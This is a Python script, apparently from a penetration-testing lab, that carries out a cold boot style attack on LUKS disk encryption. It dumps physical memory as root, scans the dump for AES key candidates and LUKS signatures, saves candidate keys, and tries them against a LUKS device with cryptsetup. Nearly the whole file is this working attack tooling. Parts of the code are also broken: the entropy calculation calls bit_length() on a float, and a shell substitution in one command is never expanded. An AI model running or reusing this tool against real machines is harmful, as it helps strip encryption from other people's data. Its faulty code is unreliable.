#!/usr/bin/env python3
"""
Cold Boot Attack Simulator for LUKS VMK Extraction
Simulates memory remanence attacks to extract Volume Master Keys from RAM

Author: Penetration Testing Lab
Target: LUKS VMK in volatile memory (RAM)
Attack Vector: Cold boot attack with memory remanence exploitation
"""

import subprocess
import struct
import sys
import os
import re
import time
import argparse
from pathlib import Path
from typing import List, Dict, Optional, Tuple

class ColdBootAttackSimulator:
    """Cold boot attack simulation for LUKS key extraction"""
    
    def __init__(self):
        self.aes_key_patterns = [
            # AES key schedule patterns for different key sizes
            b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f',  # AES-128 test pattern
            b'\x52\x09\x6a\xd5\x30\x36\xa5\x38\xbf\x40\xa3\x9e\x81\xf3\xd7\xfb',  # Common AES constant
        ]
        
        self.memory_dump_tools = {
            'lime': '/usr/share/lime/lime.ko',  # LiME kernel module
            'fmem': '/dev/fmem',                # fmem device
            'crash': '/usr/bin/crash',          # Crash utility
            'dd': '/bin/dd'                     # Direct device access
        }
        
    def check_prerequisites(self) -> Dict[str, bool]:
        """Check if memory dump tools are available"""
        available = {}
        
        # Check for LiME kernel module
        available['lime'] = Path(self.memory_dump_tools['lime']).exists()
        
        # Check for /dev/mem access (requires root)
        available['dev_mem'] = os.access('/dev/mem', os.R_OK) if Path('/dev/mem').exists() else False
        
        # Check for crash utility
        available['crash'] = Path(self.memory_dump_tools['crash']).exists()
        
        # Check for fmem module
        available['fmem'] = Path(self.memory_dump_tools['fmem']).exists()
        
        # Check if running as root
        available['root'] = os.geteuid() == 0
        
        return available
    
    def create_memory_dump(self, output_path: str, method: str = 'lime') -> bool:
        """Create memory dump using specified method"""
        
        if not os.geteuid() == 0:
            print("[ERROR] Root privileges required for memory dump")
            return False
        
        if method == 'lime':
            return self._dump_with_lime(output_path)
        elif method == 'fmem':
            return self._dump_with_fmem(output_path)
        elif method == 'dev_mem':
            return self._dump_with_dev_mem(output_path)
        elif method == 'crash':
            return self._dump_with_crash(output_path)
        else:
            print(f"[ERROR] Unknown memory dump method: {method}")
            return False
    
    def _dump_with_lime(self, output_path: str) -> bool:
        """Create memory dump using LiME (Linux Memory Extractor)"""
        try:
            # Load LiME kernel module
            if not Path(self.memory_dump_tools['lime']).exists():
                print("[ERROR] LiME kernel module not found")
                print("[INFO] Install with: sudo apt install lime-forensics-dkms")
                return False
            
            # Insert LiME module with parameters
            cmd = [
                'insmod', self.memory_dump_tools['lime'],
                f'path={output_path}',
                'format=raw',
                'dio=1'  # Direct I/O for better performance
            ]
            
            print(f"[INFO] Loading LiME module: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[ERROR] Failed to load LiME: {result.stderr}")
                return False
            
            # Wait for dump to complete
            print("[INFO] Creating memory dump...")
            time.sleep(5)  # Allow time for dump creation
            
            # Remove module
            subprocess.run(['rmmod', 'lime'], capture_output=True)
            
            if Path(output_path).exists():
                print(f"[SUCCESS] Memory dump created: {output_path}")
                return True
            else:
                print("[ERROR] Memory dump file not created")
                return False
                
        except Exception as e:
            print(f"[ERROR] LiME dump failed: {e}")
            return False
    
    def _dump_with_fmem(self, output_path: str) -> bool:
        """Create memory dump using fmem kernel module"""
        try:
            # Check if fmem module is loaded
            result = subprocess.run(['lsmod'], capture_output=True, text=True)
            if 'fmem' not in result.stdout:
                # Try to load fmem module
                subprocess.run(['modprobe', 'fmem'], check=True)
            
            if not Path('/dev/fmem').exists():
                print("[ERROR] /dev/fmem device not available")
                return False
            
            # Create memory dump using dd
            cmd = [
                'dd', 'if=/dev/fmem', f'of={output_path}', 
                'bs=1M', 'status=progress'
            ]
            
            print(f"[INFO] Creating memory dump: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Memory dump created: {output_path}")
                return True
            else:
                print(f"[ERROR] fmem dump failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[ERROR] fmem dump failed: {e}")
            return False
    
    def _dump_with_dev_mem(self, output_path: str) -> bool:
        """Create memory dump using /dev/mem (limited on modern systems)"""
        try:
            if not Path('/dev/mem').exists():
                print("[ERROR] /dev/mem not available")
                return False
            
            # Get system memory size
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.read()
            
            mem_match = re.search(r'MemTotal:\s+(\d+)\s+kB', meminfo)
            if not mem_match:
                print("[ERROR] Could not determine memory size")
                return False
            
            mem_kb = int(mem_match.group(1))
            mem_bytes = mem_kb * 1024
            
            # Create memory dump (this will be limited by kernel protections)
            cmd = [
                'dd', 'if=/dev/mem', f'of={output_path}',
                f'bs=1M', f'count={mem_bytes // (1024 * 1024)}',
                'status=progress'
            ]
            
            print(f"[INFO] Creating memory dump: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Memory dump created: {output_path}")
                return True
            else:
                print(f"[ERROR] /dev/mem dump failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[ERROR] /dev/mem dump failed: {e}")
            return False
    
    def _dump_with_crash(self, output_path: str) -> bool:
        """Create memory dump using crash utility"""
        try:
            # Use crash to dump memory
            cmd = [
                'crash', '--minimal', '-s',
                '/proc/kcore', '/boot/vmlinuz-$(uname -r)'
            ]
            
            crash_script = f"""
            rd -e -o {output_path} 0 -1
            quit
            """
            
            result = subprocess.run(cmd, input=crash_script, text=True, 
                                  capture_output=True)
            
            if result.returncode == 0:
                print(f"[SUCCESS] Memory dump created: {output_path}")
                return True
            else:
                print(f"[ERROR] crash dump failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[ERROR] crash dump failed: {e}")
            return False
    
    def analyze_memory_dump(self, dump_path: str) -> List[Dict]:
        """Analyze memory dump for LUKS VMK patterns"""
        
        if not Path(dump_path).exists():
            print(f"[ERROR] Memory dump not found: {dump_path}")
            return []
        
        print(f"[INFO] Analyzing memory dump: {dump_path}")
        
        findings = []
        chunk_size = 1024 * 1024  # 1MB chunks
        
        with open(dump_path, 'rb') as f:
            offset = 0
            
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                # Search for AES key patterns
                aes_keys = self._find_aes_keys_in_chunk(chunk, offset)
                findings.extend(aes_keys)
                
                # Search for LUKS-specific patterns
                luks_patterns = self._find_luks_patterns_in_chunk(chunk, offset)
                findings.extend(luks_patterns)
                
                offset += len(chunk)
                
                # Progress indicator
                if offset % (100 * 1024 * 1024) == 0:  # Every 100MB
                    print(f"[INFO] Analyzed {offset // (1024 * 1024)} MB...")
        
        print(f"[INFO] Analysis complete. Found {len(findings)} potential keys")
        return findings
    
    def _find_aes_keys_in_chunk(self, chunk: bytes, base_offset: int) -> List[Dict]:
        """Find potential AES keys in memory chunk"""
        findings = []
        
        # AES-256 key size is 32 bytes, expanded key schedule is 240 bytes
        for key_size in [16, 24, 32]:  # AES-128, AES-192, AES-256
            expanded_size = (key_size + 28) * 4  # Approximate expanded key size
            
            # Search for high entropy regions that could be AES keys
            for i in range(len(chunk) - expanded_size):
                candidate = chunk[i:i + expanded_size]
                
                if self._is_potential_aes_key(candidate, key_size):
                    findings.append({
                        'type': 'AES_KEY_CANDIDATE',
                        'offset': base_offset + i,
                        'size': key_size,
                        'expanded_size': expanded_size,
                        'data': candidate[:key_size].hex(),
                        'expanded_data': candidate.hex(),
                        'entropy': self._calculate_entropy(candidate[:key_size])
                    })
        
        return findings
    
    def _find_luks_patterns_in_chunk(self, chunk: bytes, base_offset: int) -> List[Dict]:
        """Find LUKS-specific patterns in memory chunk"""
        findings = []
        
        # LUKS magic signatures
        luks_signatures = [
            b'LUKS\xba\xbe',  # LUKS1 magic
            b'SKUL\xba\xbe',  # LUKS2 magic
            b'LUKSE',         # Potential LUKS string
        ]
        
        for signature in luks_signatures:
            offset = chunk.find(signature)
            while offset != -1:
                findings.append({
                    'type': 'LUKS_SIGNATURE',
                    'offset': base_offset + offset,
                    'signature': signature.hex(),
                    'context': chunk[offset:offset + 64].hex()  # 64 bytes of context
                })
                
                # Find next occurrence
                offset = chunk.find(signature, offset + 1)
        
        # Search for dm-crypt related strings
        dm_crypt_patterns = [
            b'dm-crypt',
            b'crypt_',
            b'luks',
            b'cipher',
            b'keyslot'
        ]
        
        for pattern in dm_crypt_patterns:
            offset = chunk.find(pattern)
            while offset != -1:
                findings.append({
                    'type': 'DM_CRYPT_PATTERN',
                    'offset': base_offset + offset,
                    'pattern': pattern.decode('utf-8', errors='ignore'),
                    'context': chunk[offset:offset + 32].hex()
                })
                
                offset = chunk.find(pattern, offset + 1)
        
        return findings
    
    def _is_potential_aes_key(self, candidate: bytes, key_size: int) -> bool:
        """Check if bytes could be an AES key based on entropy and patterns"""
        
        if len(candidate) < key_size:
            return False
        
        key_bytes = candidate[:key_size]
        
        # Check entropy (AES keys should have high entropy)
        entropy = self._calculate_entropy(key_bytes)
        if entropy < 7.0:  # Threshold for high entropy
            return False
        
        # Check for obvious patterns that indicate it's not a key
        if len(set(key_bytes)) < key_size // 4:  # Too few unique bytes
            return False
        
        # Check for null bytes (less likely in real keys)
        null_count = key_bytes.count(0)
        if null_count > key_size // 4:
            return False
        
        return True
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy of byte sequence"""
        if len(data) == 0:
            return 0
        
        # Count byte frequencies
        frequencies = [0] * 256
        for byte in data:
            frequencies[byte] += 1
        
        # Calculate entropy
        entropy = 0.0
        length = len(data)
        
        for count in frequencies:
            if count > 0:
                probability = count / length
                entropy -= probability * (probability.bit_length() - 1)
        
        return entropy
    
    def extract_potential_vmk(self, findings: List[Dict], output_dir: str) -> List[str]:
        """Extract potential VMKs from analysis findings"""
        
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        extracted_keys = []
        
        # Sort findings by entropy (higher is better)
        aes_candidates = [f for f in findings if f['type'] == 'AES_KEY_CANDIDATE']
        aes_candidates.sort(key=lambda x: x.get('entropy', 0), reverse=True)
        
        # Extract top candidates
        for i, candidate in enumerate(aes_candidates[:10]):  # Top 10 candidates
            key_file = output_path / f"potential_vmk_{i:02d}.key"
            
            # Write binary key data
            with open(key_file, 'wb') as f:
                f.write(bytes.fromhex(candidate['data']))
            
            # Create metadata file
            meta_file = output_path / f"potential_vmk_{i:02d}.json"
            with open(meta_file, 'w') as f:
                import json
                json.dump(candidate, f, indent=2)
            
            extracted_keys.append(str(key_file))
            
            print(f"[INFO] Extracted key candidate {i}: {key_file}")
            print(f"  Offset: 0x{candidate['offset']:08x}")
            print(f"  Size: {candidate['size']} bytes")
            print(f"  Entropy: {candidate['entropy']:.2f}")
        
        return extracted_keys
    
    def test_extracted_keys(self, key_files: List[str], luks_device: str) -> Dict:
        """Test extracted keys against LUKS device"""
        
        results = {
            'tested_keys': 0,
            'successful_keys': [],
            'failed_keys': []
        }
        
        for key_file in key_files:
            if not Path(key_file).exists():
                continue
            
            results['tested_keys'] += 1
            
            # Try to use key with cryptsetup
            try:
                # Test key (this would require the key to be in the right format)
                # In a real scenario, you'd need to reconstruct the full LUKS key structure
                test_cmd = [
                    'cryptsetup', 'luksOpen', '--test-passphrase', 
                    '--key-file', key_file, luks_device
                ]
                
                result = subprocess.run(test_cmd, capture_output=True, text=True, 
                                      timeout=30)
                
                if result.returncode == 0:
                    results['successful_keys'].append(key_file)
                    print(f"[SUCCESS] Key works: {key_file}")
                else:
                    results['failed_keys'].append(key_file)
                    print(f"[FAILED] Key doesn't work: {key_file}")
                    
            except subprocess.TimeoutExpired:
                results['failed_keys'].append(key_file)
                print(f"[TIMEOUT] Key test timed out: {key_file}")
            except Exception as e:
                results['failed_keys'].append(key_file)
                print(f"[ERROR] Key test failed: {key_file} - {e}")
        
        return results
    
    def simulate_memory_degradation(self, dump_path: str, output_path: str, 
                                  degradation_level: float = 0.1) -> bool:
        """Simulate memory degradation from cold boot conditions"""
        
        if not 0.0 <= degradation_level <= 1.0:
            print("[ERROR] Degradation level must be between 0.0 and 1.0")
            return False
        
        print(f"[INFO] Simulating memory degradation (level: {degradation_level})")
        
        try:
            with open(dump_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                while True:
                    chunk = infile.read(4096)
                    if not chunk:
                        break
                    
                    # Introduce bit flips based on degradation level
                    degraded_chunk = bytearray(chunk)
                    
                    for i in range(len(degraded_chunk)):
                        # Random chance of bit flip
                        import random
                        if random.random() < degradation_level:
                            # Flip a random bit in this byte
                            bit_pos = random.randint(0, 7)
                            degraded_chunk[i] ^= (1 << bit_pos)
                    
                    outfile.write(degraded_chunk)
            
            print(f"[SUCCESS] Degraded memory dump created: {output_path}")
            return True
            
        except Exception as e:
            print(f"[ERROR] Memory degradation simulation failed: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(description='Cold Boot Attack Simulator for LUKS VMK Extraction')
    parser.add_argument('action', choices=['check', 'dump', 'analyze', 'extract', 'test', 'degrade'])
    parser.add_argument('-o', '--output', help='Output file/directory')
    parser.add_argument('-i', '--input', help='Input file (memory dump)')
    parser.add_argument('-d', '--device', help='LUKS device to test against')
    parser.add_argument('-m', '--method', choices=['lime', 'fmem', 'dev_mem', 'crash'], 
                       default='lime', help='Memory dump method')
    parser.add_argument('--degradation', type=float, default=0.1, 
                       help='Memory degradation level (0.0-1.0)')
    
    args = parser.parse_args()
    
    simulator = ColdBootAttackSimulator()
    
    if args.action == 'check':
        print("Checking cold boot attack prerequisites...")
        prerequisites = simulator.check_prerequisites()
        
        for tool, available in prerequisites.items():
            status = "✓" if available else "✗"
            print(f"{status} {tool}: {'Available' if available else 'Not available'}")
        
        if not prerequisites['root']:
            print("\n[WARNING] Root privileges required for memory operations")
        
        if not any([prerequisites['lime'], prerequisites['fmem'], prerequisites['dev_mem']]):
            print("\n[WARNING] No memory dump tools available")
            print("Install LiME: sudo apt install lime-forensics-dkms")
    
    elif args.action == 'dump':
        if not args.output:
            print("[ERROR] Output file required for memory dump")
            return
        
        print(f"[INFO] Creating memory dump using method: {args.method}")
        success = simulator.create_memory_dump(args.output, args.method)
        
        if success:
            size = Path(args.output).stat().st_size
            print(f"[SUCCESS] Memory dump created: {args.output} ({size:,} bytes)")
        else:
            print("[ERROR] Memory dump failed")
    
    elif args.action == 'analyze':
        if not args.input:
            print("[ERROR] Input memory dump file required")
            return
        
        findings = simulator.analyze_memory_dump(args.input)
        
        print(f"\n[ANALYSIS RESULTS]")
        print(f"Total findings: {len(findings)}")
        
        # Summarize findings by type
        by_type = {}
        for finding in findings:
            ftype = finding['type']
            by_type[ftype] = by_type.get(ftype, 0) + 1
        
        for ftype, count in by_type.items():
            print(f"  {ftype}: {count}")
        
        # Show top AES key candidates
        aes_candidates = [f for f in findings if f['type'] == 'AES_KEY_CANDIDATE']
        if aes_candidates:
            print(f"\nTop AES key candidates:")
            aes_candidates.sort(key=lambda x: x.get('entropy', 0), reverse=True)
            
            for i, candidate in enumerate(aes_candidates[:5]):
                print(f"  {i+1}. Offset: 0x{candidate['offset']:08x}, "
                      f"Size: {candidate['size']} bytes, "
                      f"Entropy: {candidate['entropy']:.2f}")
    
    elif args.action == 'extract':
        if not args.input or not args.output:
            print("[ERROR] Input memory dump and output directory required")
            return
        
        # Analyze first
        findings = simulator.analyze_memory_dump(args.input)
        
        # Extract potential VMKs
        extracted_keys = simulator.extract_potential_vmk(findings, args.output)
        
        print(f"[SUCCESS] Extracted {len(extracted_keys)} potential VMKs to {args.output}")
    
    elif args.action == 'test':
        if not args.input or not args.device:
            print("[ERROR] Key files directory and LUKS device required")
            return
        
        # Find key files in directory
        key_dir = Path(args.input)
        key_files = list(key_dir.glob("*.key"))
        
        if not key_files:
            print(f"[ERROR] No key files found in {args.input}")
            return
        
        print(f"[INFO] Testing {len(key_files)} extracted keys against {args.device}")
        results = simulator.test_extracted_keys([str(f) for f in key_files], args.device)
        
        print(f"\n[TEST RESULTS]")
        print(f"Keys tested: {results['tested_keys']}")
        print(f"Successful: {len(results['successful_keys'])}")
        print(f"Failed: {len(results['failed_keys'])}")
        
        if results['successful_keys']:
            print("\nWorking keys:")
            for key_file in results['successful_keys']:
                print(f"  {key_file}")
    
    elif args.action == 'degrade':
        if not args.input or not args.output:
            print("[ERROR] Input and output files required")
            return
        
        success = simulator.simulate_memory_degradation(args.input, args.output, 
                                                      args.degradation)
        if success:
            print(f"[SUCCESS] Memory degradation simulation complete")


if __name__ == "__main__":
    main()